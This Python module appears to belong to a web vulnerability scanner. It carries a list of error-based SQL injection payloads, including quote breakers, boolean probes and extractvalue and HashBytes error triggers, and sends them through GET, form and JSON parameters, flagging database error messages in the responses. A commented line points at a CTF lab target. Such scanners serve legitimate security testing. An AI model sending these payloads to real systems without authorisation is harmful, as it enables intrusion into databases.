import json

from lib.rule.sensitive_error_message import sensitive_page_error_message_check
from lib.core.common import random_str, random_num, get_replaced_url, vuln_print
from urllib import parse
import requests
from lib.settings import vuln_level


class SQLIErrorCheck:
    def __init__(self):
        self.num = random_num(4)
        self.s = random_str(4)
        self._payloads = [
            '鎈\'"\\(',
            "'",
            "')",
            "';",
            '"',
            '")',
            '";',
            ' order By 500 ',
            "--",
            "-0",
            ") AND {}={} AND ({}={}".format(
                self.num,
                self.num + 1,
                self.num,
                self.num),
            " AND {}={}%23".format(
                self.num,
                self.num + 1),
            " %' AND {}={} AND '%'='".format(
                self.num,
                self.num + 1),
            " ') AND {}={} AND ('{}'='{}".format(
                self.num,
                self.num + 1,
                self.s,
                self.s),
            " ' AND {}={} AND '{}'='{}".format(
                self.num,
                self.num + 1,
                self.s,
                self.s),
            '`',
            '`)',
            '`;',
            '\\',
            "%27",
            "%%2727",
            "%25%27",
            "%60",
            "%5C",
            "extractvalue(1,concat(char(126),md5({})))".format(random_num),
            "convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num)]

    def check_get_error_sqli(self, request):
        url = request.url
        dict = parse.parse_qs(parse.urlparse(url).query)
        for key, value in dict.items():
            if len(value) == 1:
                for payload in self._payloads:
                    url1 = get_replaced_url(
                        url, dict[key][0], dict[key][0] + payload)
                    html = requests.get(url1, headers=request.headers).text
                    res = sensitive_page_error_message_check(html)
                    if len(res) == 1:
                        print(
                            "database: " +
                            res[0]['type'] +
                            "\nerror message: " +
                            res[0]['text'])
                        vuln_print(
                            url1, "sqli", vuln_level["sqli"], request.method)
                        return 0

    def check_post_urlencode_error_sqli(self, request):
        url = request.url
        body = request.get_text()
        mid_url = "https://www.baidu.com?" + body
        dict = parse.parse_qs(parse.urlparse(mid_url).query)
        for key, value in dict.items():
            if len(value) == 1:
                for payload in self._payloads:
                    dict[key][0] = dict[key][0] + payload
                    html = requests.post(
                        url, data=dict, headers=request.headers).text
                    res = sensitive_page_error_message_check(html)
                    if len(res) == 1:
                        print(
                            "database: " +
                            res[0]['type'] +
                            "\nerror message: " +
                            res[0]['text'])
                        vuln_print(
                            url,
                            "sqli",
                            vuln_level["sqli"],
                            request.method,
                            str(dict))
                        return 0

    def check_post_json_error_sqli(self, request):
        url = request.url
        body = request.get_text()
        dict = json.loads(body)
        for key, value in dict.items():
            if type(value).__name__ == "str":
                for payload in self._payloads:
                    dict[key] = dict[key] + payload
                    html = requests.post(
                        url, data=json.dumps(dict), headers=request.headers).text
                    res = sensitive_page_error_message_check(html)
                    if len(res) == 1:
                        print(
                            "database: " +
                            res[0]['type'] +
                            "\nerror message: " +
                            res[0]['text'])
                        vuln_print(
                            url,
                            "sqli",
                            vuln_level["sqli"],
                            request.method,
                            body)
                        return 0

# if __name__ == "__main__":
#     sqli = SQLI()
#     sqli.check_get_error_sqli("http://abef3b19-fd61-4a2e-8217-f12b318434b5.node4.buuoj.cn/Less-1/?id=2")
